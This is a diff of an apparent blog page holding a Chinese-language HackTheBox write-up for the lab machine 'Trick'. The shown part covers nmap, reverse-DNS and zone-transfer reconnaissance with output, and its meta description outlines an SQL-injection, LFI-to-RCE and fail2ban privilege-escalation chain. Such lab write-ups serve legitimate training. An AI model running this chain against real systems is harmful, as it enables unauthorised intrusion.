@@ -6,7 +6,7 @@
 			else document.documentElement.removeAttribute('data-theme');
 		} catch {}
 	})();
-</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/machines/0477-trick/"><!-- Primary Meta Tags --><title>Trick · Zumpyx&#39;s Blog</title><meta name="description" content="Trick is an Easy Linux machine that features a DNS server and multiple vHost&amp;amp;amp;amp;amp;amp;amp;#039;s that all require various steps to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management System that is vulnerable to SQL Injection. Using `sqlmap` we find we have file privileges and can read system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File Inclusion (LFI) vulnerability that can be exploited. Sending a mail to one of the users with PHP code embedded and then including that mail with the LFI allows for Remote Code Execution (RCE). After the initial foothold we find a Sudo command that can be executed without a password. The command restarts the `fail2ban` service. The configuration directory of fail2ban contains a directory that is owned by a group that the current user is part of. The user has write access to the directory and can rename a configuration file and replace it with their own, which leads to Remote Code Execution  as root once a ban is triggered."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/machines/0477-trick/"><meta property="og:title" content="Trick · Zumpyx's Blog"><meta property="og:description" content="Trick is an Easy Linux machine that features a DNS server and multiple vHost&amp;amp;amp;amp;amp;amp;amp;#039;s that all require various steps to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management System that is vulnerable to SQL Injection. Using `sqlmap` we find we have file privileges and can read system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File Inclusion (LFI) vulnerability that can be exploited. Sending a mail to one of the users with PHP code embedded and then including that mail with the LFI allows for Remote Code Execution (RCE). After the initial foothold we find a Sudo command that can be executed without a password. The command restarts the `fail2ban` service. The configuration directory of fail2ban contains a directory that is owned by a group that the current user is part of. The user has write access to the directory and can rename a configuration file and replace it with their own, which leads to Remote Code Execution  as root once a ban is triggered."><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/machines/0477-trick/"><meta name="twitter:title" content="Trick · Zumpyx's Blog"><meta name="twitter:description" content="Trick is an Easy Linux machine that features a DNS server and multiple vHost&amp;amp;amp;amp;amp;amp;amp;#039;s that all require various steps to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management System that is vulnerable to SQL Injection. Using `sqlmap` we find we have file privileges and can read system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File Inclusion (LFI) vulnerability that can be exploited. Sending a mail to one of the users with PHP code embedded and then including that mail with the LFI allows for Remote Code Execution (RCE). After the initial foothold we find a Sudo command that can be executed without a password. The command restarts the `fail2ban` service. The configuration directory of fail2ban contains a directory that is owned by a group that the current user is part of. The user has write access to the directory and can rename a configuration file and replace it with their own, which leads to Remote Code Execution  as root once a ban is triggered."><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.CMmW25g2.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}
+</script><style>@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/89758defcfa85239.woff") format("woff");font-display:swap;font-weight:400;font-style:normal;}@font-face{font-family:Atkinson-c7f4c4e8b285552f;src:url("/_astro/fonts/14aa8dd5744dd4bc.woff") format("woff");font-display:swap;font-weight:700;font-style:normal;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial";src:local("Arial");font-display:swap;font-weight:400;font-style:normal;size-adjust:99.3717%;ascent-override:80.1033%;descent-override:25.2587%;line-gap-override:0%;}@font-face{font-family:"Atkinson-c7f4c4e8b285552f fallback: Arial Bold";src:local("Arial Bold");font-display:swap;font-weight:700;font-style:normal;size-adjust:92.2954%;ascent-override:86.2448%;descent-override:27.1953%;line-gap-override:0%;}:root{--font-atkinson:Atkinson-c7f4c4e8b285552f,"Atkinson-c7f4c4e8b285552f fallback: Arial","Atkinson-c7f4c4e8b285552f fallback: Arial Bold",sans-serif;}</style><link rel="preload" href="/_astro/fonts/89758defcfa85239.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/_astro/fonts/14aa8dd5744dd4bc.woff" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://blog.zumpyx.com/hackthebox/machines/0477-trick/"><!-- Primary Meta Tags --><title>Trick · Zumpyx&#39;s Blog</title><meta name="description" content="Trick is an Easy Linux machine that features a DNS server and multiple vHost's that all require various steps to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management System that is vulnerable to SQL Injection. Using `sqlmap` we find we have file privileges and can read system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File Inclusion (LFI) vulnerability that can be exploited. Sending a mail to one of the users with PHP code embedded and then including that mail with the LFI allows for Remote Code Execution (RCE). After the initial foothold we find a Sudo command that can be executed without a password. The command restarts the `fail2ban` service. The configuration directory of fail2ban contains a directory that is owned by a group that the current user is part of. The user has write access to the directory and can rename a configuration file and replace it with their own, which leads to Remote Code Execution  as root once a ban is triggered."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.zumpyx.com/hackthebox/machines/0477-trick/"><meta property="og:title" content="Trick · Zumpyx's Blog"><meta property="og:description" content="Trick is an Easy Linux machine that features a DNS server and multiple vHost's that all require various steps to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management System that is vulnerable to SQL Injection. Using `sqlmap` we find we have file privileges and can read system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File Inclusion (LFI) vulnerability that can be exploited. Sending a mail to one of the users with PHP code embedded and then including that mail with the LFI allows for Remote Code Execution (RCE). After the initial foothold we find a Sudo command that can be executed without a password. The command restarts the `fail2ban` service. The configuration directory of fail2ban contains a directory that is owned by a group that the current user is part of. The user has write access to the directory and can rename a configuration file and replace it with their own, which leads to Remote Code Execution  as root once a ban is triggered."><meta property="og:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><!-- Twitter --><meta name="twitter:card" content="summary_large_image"><meta name="twitter:url" content="https://blog.zumpyx.com/hackthebox/machines/0477-trick/"><meta name="twitter:title" content="Trick · Zumpyx's Blog"><meta name="twitter:description" content="Trick is an Easy Linux machine that features a DNS server and multiple vHost's that all require various steps to gain a foothold. It requires basic knowledge of DNS in order to get a domain name and then subdomain that can be used to access the first vHost. On the first vHost we are greeted with a Payroll Management System that is vulnerable to SQL Injection. Using `sqlmap` we find we have file privileges and can read system files. Reading an Nginx configuration file reveals another vHost. This vHost contains a Local File Inclusion (LFI) vulnerability that can be exploited. Sending a mail to one of the users with PHP code embedded and then including that mail with the LFI allows for Remote Code Execution (RCE). After the initial foothold we find a Sudo command that can be executed without a password. The command restarts the `fail2ban` service. The configuration directory of fail2ban contains a directory that is owned by a group that the current user is part of. The user has write access to the directory and can rename a configuration file and replace it with their own, which leads to Remote Code Execution  as root once a ban is triggered."><meta name="twitter:image" content="https://blog.zumpyx.com/_astro/head.CE6FOIKY.png"><link rel="stylesheet" href="/_astro/Header.CMmW25g2.css"><style>.machine-list[data-astro-cid-twh6cqtg]{border:1px solid var(--border);border-radius:var(--radius);background:var(--bg-elevated);box-shadow:var(--shadow);margin-bottom:2rem;padding:1rem 1.15rem}.machine-list[data-astro-cid-twh6cqtg] h2[data-astro-cid-twh6cqtg]{font-size:1.1rem;font-family:var(--font-mono);color:var(--accent);margin:0 0 .65rem}.machine-list[data-astro-cid-twh6cqtg] ul[data-astro-cid-twh6cqtg]{margin:0;padding-left:1.2rem}.machine-list[data-astro-cid-twh6cqtg] li[data-astro-cid-twh6cqtg]{margin:.35rem 0}.machine-ref[data-astro-cid-twh6cqtg]{color:var(--text-bright);align-items:center;gap:.5rem;text-decoration:none;display:inline-flex}.machine-ref[data-astro-cid-twh6cqtg]:hover{color:var(--accent)}.machine-ref[data-astro-cid-twh6cqtg] img[data-astro-cid-twh6cqtg]{object-fit:cover;border:1px solid var(--border);border-radius:6px}.missing[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-family:var(--font-mono);font-size:.9em}.diff[data-astro-cid-twh6cqtg]{color:var(--text-muted);font-size:.9em}.diff[data-astro-cid-twh6cqtg].very-easy{color:var(--very-easy)}.diff[data-astro-cid-twh6cqtg].easy{color:var(--easy)}.diff[data-astro-cid-twh6cqtg].medium{color:var(--medium)}.diff[data-astro-cid-twh6cqtg].hard{color:var(--hard)}.diff[data-astro-cid-twh6cqtg].insane{color:var(--insane)}.meta .badge.locked{color:var(--medium,#fc0);background:#ffcc001a;border-color:#ffcc0059}
 </style><link rel="stylesheet" href="/_astro/ArticleLayout.DA3idRZl.css"><style>.nav-link[data-astro-cid-evkijfd6]{color:var(--text-muted);font-family:var(--font-mono);letter-spacing:.04em;text-transform:uppercase;white-space:nowrap;border:1px solid #0000;border-radius:999px;justify-content:center;align-items:center;padding:.5em .95em;font-size:.78rem;font-weight:500;text-decoration:none;transition:color .18s,background .18s,border-color .18s,box-shadow .18s;display:inline-flex}.nav-link[data-astro-cid-evkijfd6]:hover{color:var(--text-bright);background:var(--surface-hover);text-decoration:none}.nav-link[data-astro-cid-evkijfd6].active{color:var(--on-accent);background:linear-gradient(135deg, var(--accent-hover), var(--accent));box-shadow:0 0 0 1px var(--border-strong), 0 6px 16px var(--accent-glow-strong);text-shadow:none;border-color:#0000;font-weight:700;text-decoration:none}
 </style><script type="module" src="/_astro/page.CTxKKjGj.js"></script></head><body data-astro-cid-sgg5joot><div class="scanline" aria-hidden="true" data-astro-cid-sgg5joot></div><header data-astro-cid-nen7h5rs><div class="bar" data-astro-cid-nen7h5rs><a class="brand" href="/" data-astro-cid-nen7h5rs><span class="logo" aria-hidden="true" data-astro-cid-nen7h5rs><img src="/_astro/head.CE6FOIKY_1SW1hc.webp" srcset="/_astro/head.CE6FOIKY_1SW1hc.webp 1x, /_astro/head.CE6FOIKY_scYzG.webp 2x" alt data-astro-cid-nen7h5rs="true" loading="lazy" decoding="async" width="64" height="64" class="logo-img"></span><span class="brand-text" data-astro-cid-nen7h5rs><span class="brand-name" data-astro-cid-nen7h5rs>Zumpyx&#39;s Blog</span></span></a><nav class="nav-pill" aria-label="Primary" data-astro-cid-nen7h5rs><div class="nav-track" data-astro-cid-nen7h5rs><a href="/" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Home</a><a href="/blog" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Blog</a><a href="/hackthebox" class="nav-link active" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>HackTheBox</a><a href="/projects" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>Projects</a><a href="/about" class="nav-link" data-astro-cid-nen7h5rs="true" data-astro-cid-evkijfd6>About</a></div></nav><div class="actions" data-astro-cid-nen7h5rs><button type="button" class="icon-btn search-trigger" data-search-open aria-label="搜索" title="搜索 (Ctrl/⌘+K)" data-astro-cid-7yy3665x><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg></button><div class="search-root" data-search-root hidden data-astro-cid-7yy3665x><div class="search-backdrop" data-search-close data-astro-cid-7yy3665x></div><div class="search-panel" role="dialog" aria-modal="true" aria-label="全站搜索" data-astro-cid-7yy3665x><div class="search-bar" data-astro-cid-7yy3665x><svg class="search-ico" viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-7yy3665x><circle cx="11" cy="11" r="6.5" data-astro-cid-7yy3665x></circle><path d="M16.5 16.5 21 21" stroke-linecap="round" data-astro-cid-7yy3665x></path></svg><input type="search" class="search-input" data-search-input placeholder="全文搜索：标题 / 正文 / 标签…" autocomplete="off" autocapitalize="off" spellcheck="false" enterkeyhint="search" data-astro-cid-7yy3665x><kbd class="search-kbd" data-search-close-hint data-astro-cid-7yy3665x>Esc</kbd></div><div class="search-meta" data-search-meta data-astro-cid-7yy3665x>输入关键词开始搜索</div><ul class="search-results" data-search-results role="listbox" aria-label="搜索结果" data-astro-cid-7yy3665x></ul></div></div><script type="module" src="/_astro/SiteSearch.astro_astro_type_script_index_0_lang.CiT4pk6n.js"></script><button type="button" class="icon-btn theme-toggle" data-theme-toggle aria-label="主题：跟随系统" title="主题：跟随系统（点击切换）" data-astro-cid-l6lhmie6><span class="icon icon-system" aria-hidden="true" data-astro-cid-l6lhmie6><!-- auto / system --><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><rect x="3" y="4" width="18" height="12" rx="2" data-astro-cid-l6lhmie6></rect><path d="M8 20h8M12 16v4" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-light" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><circle cx="12" cy="12" r="4" data-astro-cid-l6lhmie6></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41" data-astro-cid-l6lhmie6></path></svg></span><span class="icon icon-dark" aria-hidden="true" hidden data-astro-cid-l6lhmie6><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" data-astro-cid-l6lhmie6><path d="M21 14.5A8.5 8.5 0 1 1 9.5 3a7 7 0 0 0 11.5 11.5z" stroke-linejoin="round" data-astro-cid-l6lhmie6></path></svg></span></button><script>
 	(() => {
@@ -70,19 +70,553 @@
 			});
 		} catch {}
 	})();
-</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="article-shell" data-astro-cid-sgg5joot><div class="prose" data-article-body data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2022-06-18T00:00:00.000Z">2022-06-18</time></div><div class="title-row" data-astro-cid-sgg5joot><img src="/_astro/avatar.FuR7yIay_nBNqt.webp" alt data-astro-cid-sgg5joot="true" loading="lazy" decoding="async" width="48" height="48" class="avatar"><h1 data-astro-cid-sgg5joot>Trick</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Machines</span><span class="badge" data-astro-cid-twh6cqtg>#477</span><span class="badge difficulty-easy" data-astro-cid-twh6cqtg>Easy</span><span class="badge" data-astro-cid-twh6cqtg>Linux</span><span class="badge" data-astro-cid-twh6cqtg>WIP</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/machines/" data-astro-cid-twh6cqtg>← Machines</a></div><hr data-astro-cid-sgg5joot></div><div class="content" data-article-content data-astro-cid-sgg5joot><h2 id="用到的工具">用到的工具</h2>
-<ul>
-<li>nmap</li>
-</ul>
-<h2 id="recon--enum">Recon &amp; Enum</h2>
+</script><a class="icon-btn" href="/rss.xml" target="_blank" rel="noopener noreferrer" title="RSS" aria-label="RSS 订阅" data-astro-cid-nen7h5rs><svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true" data-astro-cid-nen7h5rs><path d="M5 19a1.5 1.5 0 1 0 0.01 0" fill="currentColor" stroke="none" data-astro-cid-nen7h5rs></path><path d="M4 11a9 9 0 0 1 9 9" stroke-linecap="round" data-astro-cid-nen7h5rs></path><path d="M4 5a15 15 0 0 1 15 15" stroke-linecap="round" data-astro-cid-nen7h5rs></path></svg></a></div></div></header><main data-astro-cid-sgg5joot><article data-astro-cid-sgg5joot><div class="article-shell" data-astro-cid-sgg5joot><div class="prose" data-article-body data-astro-cid-sgg5joot><div class="title" data-astro-cid-sgg5joot><div class="date" data-astro-cid-sgg5joot><time datetime="2022-06-18T00:00:00.000Z">2022-06-18</time></div><div class="title-row" data-astro-cid-sgg5joot><img src="/_astro/avatar.FuR7yIay_nBNqt.webp" alt data-astro-cid-sgg5joot="true" loading="lazy" decoding="async" width="48" height="48" class="avatar"><h1 data-astro-cid-sgg5joot>Trick</h1></div><div class="meta" data-astro-cid-sgg5joot><span class="badge" data-astro-cid-twh6cqtg>Machines</span><span class="badge" data-astro-cid-twh6cqtg>#477</span><span class="badge difficulty-easy" data-astro-cid-twh6cqtg>Easy</span><span class="badge" data-astro-cid-twh6cqtg>Linux</span><span class="badge" data-astro-cid-twh6cqtg>DNSEnum</span><span class="badge" data-astro-cid-twh6cqtg>LFI</span><span class="badge" data-astro-cid-twh6cqtg>PHP_Wrappers</span><span class="badge" data-astro-cid-twh6cqtg>SQLi</span><span class="badge" data-astro-cid-twh6cqtg>Vhost</span><span class="badge" data-astro-cid-twh6cqtg>fail2ban</span></div><div class="links" data-astro-cid-sgg5joot><a href="/hackthebox/machines/" data-astro-cid-twh6cqtg>← Machines</a></div><hr data-astro-cid-sgg5joot></div><div class="content" data-article-content data-astro-cid-sgg5joot><h2 id="recon--enum">Recon &amp; Enum</h2>
 <h3 id="port-scan">Port Scan</h3>
-<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">nmap</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -sC</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -sV</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -p-</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> --min-rate</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> 1000</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -T4</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -oA</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> log/nmap</span></span></code></pre>
-<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>PORT     STATE SERVICE  VERSION</span></span></code></pre>
-<h2 id="shell-as-user">Shell as User</h2>
-<h3 id="exploit">Exploit</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>PORT   STATE SERVICE VERSION</span></span>
+<span class="line"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span></span>
+<span class="line"><span>| ssh-hostkey: </span></span>
+<span class="line"><span>|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)</span></span>
+<span class="line"><span>|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)</span></span>
+<span class="line"><span>|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)</span></span>
+<span class="line"><span>25/tcp open  smtp?</span></span>
+<span class="line"><span>|_smtp-commands: Couldn't establish connection on port 25</span></span>
+<span class="line"><span>53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)</span></span>
+<span class="line"><span>| dns-nsid: </span></span>
+<span class="line"><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian</span></span>
+<span class="line"><span>80/tcp open  http    nginx 1.14.2</span></span>
+<span class="line"><span>| http-methods: </span></span>
+<span class="line"><span>|_  Supported Methods: GET HEAD</span></span>
+<span class="line"><span>|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA</span></span>
+<span class="line"><span>|_http-title: Coming Soon - Start Bootstrap Theme</span></span>
+<span class="line"><span>|_http-server-header: nginx/1.14.2</span></span></code></pre>
+<h3 id="domain-enum">Domain Enum</h3>
+<ul>
+<li>dig 反查域名</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ dig @$IP -x $IP       </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>; &lt;&lt;&gt;&gt; DiG 9.20.0-Debian &lt;&lt;&gt;&gt; @10.129.227.180 -x 10.129.227.180</span></span>
+<span class="line"><span>; (1 server found)</span></span>
+<span class="line"><span>;; global options: +cmd</span></span>
+<span class="line"><span>;; Got answer:</span></span>
+<span class="line"><span>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 53310</span></span>
+<span class="line"><span>;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3</span></span>
+<span class="line"><span>;; WARNING: recursion requested but not available</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>;; OPT PSEUDOSECTION:</span></span>
+<span class="line"><span>; EDNS: version: 0, flags:; udp: 4096</span></span>
+<span class="line"><span>; COOKIE: 89ba66f8ff07033b65c7972267499248e6d2b346e88f7c87 (good)</span></span>
+<span class="line"><span>;; QUESTION SECTION:</span></span>
+<span class="line"><span>;180.227.129.10.in-addr.arpa.   IN      PTR</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>;; ANSWER SECTION:</span></span>
+<span class="line"><span>180.227.129.10.in-addr.arpa. 604800 IN  PTR     trick.htb.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>;; AUTHORITY SECTION:</span></span>
+<span class="line"><span>227.129.10.in-addr.arpa. 604800 IN      NS      trick.htb.</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>;; ADDITIONAL SECTION:</span></span>
+<span class="line"><span>trick.htb.              604800  IN      A       127.0.0.1</span></span>
+<span class="line"><span>trick.htb.              604800  IN      AAAA    ::1</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>;; Query time: 96 msec</span></span>
+<span class="line"><span>;; SERVER: 10.129.227.180#53(10.129.227.180) (UDP)</span></span>
+<span class="line"><span>;; WHEN: Fri Nov 29 05:07:04 EST 2024</span></span>
+<span class="line"><span>;; MSG SIZE  rcvd: 165</span></span></code></pre>
+<ul>
+<li>dig 区域传输查询子域名</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ dig @$IP axfr $Domain </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>; &lt;&lt;&gt;&gt; DiG 9.20.0-Debian &lt;&lt;&gt;&gt; @10.129.227.180 axfr trick.htb</span></span>
+<span class="line"><span>; (1 server found)</span></span>
+<span class="line"><span>;; global options: +cmd</span></span>
+<span class="line"><span>trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span></span>
+<span class="line"><span>trick.htb.              604800  IN      NS      trick.htb.</span></span>
+<span class="line"><span>trick.htb.              604800  IN      A       127.0.0.1</span></span>
+<span class="line"><span>trick.htb.              604800  IN      AAAA    ::1</span></span>
+<span class="line"><span>preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.</span></span>
+<span class="line"><span>trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span></span>
+<span class="line"><span>;; Query time: 184 msec</span></span>
+<span class="line"><span>;; SERVER: 10.129.227.180#53(10.129.227.180) (TCP)</span></span>
+<span class="line"><span>;; WHEN: Fri Nov 29 05:06:48 EST 2024</span></span>
+<span class="line"><span>;; XFR size: 6 records (messages 1, bytes 231)</span></span></code></pre>
+<ul>
+<li>也可以使用 host 命令替代</li>
+</ul>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ host $IP $IP    </span></span>
+<span class="line"><span>Using domain server:</span></span>
+<span class="line"><span>Name: 10.129.227.180</span></span>
+<span class="line"><span>Address: 10.129.227.180#53</span></span>
+<span class="line"><span>Aliases: </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>180.227.129.10.in-addr.arpa domain name pointer trick.htb.</span></span></code></pre>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ host -la $Domain $IP</span></span>
+<span class="line"><span>Trying "trick.htb"</span></span>
+<span class="line"><span>Using domain server:</span></span>
+<span class="line"><span>Name: 10.129.227.180</span></span>
+<span class="line"><span>Address: 10.129.227.180#53</span></span>
+<span class="line"><span>Aliases: </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 22171</span></span>
+<span class="line"><span>;; flags: qr aa; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>;; QUESTION SECTION:</span></span>
+<span class="line"><span>;trick.htb.                     IN      AXFR</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>;; ANSWER SECTION:</span></span>
+<span class="line"><span>trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800</span></span>
+<span class="line"><span>trick.htb.              604800  IN      NS      trick.htb.</span></span>
+<span class="line"><span>trick.htb.              604800  IN      A       127.0.0.1</span></span>
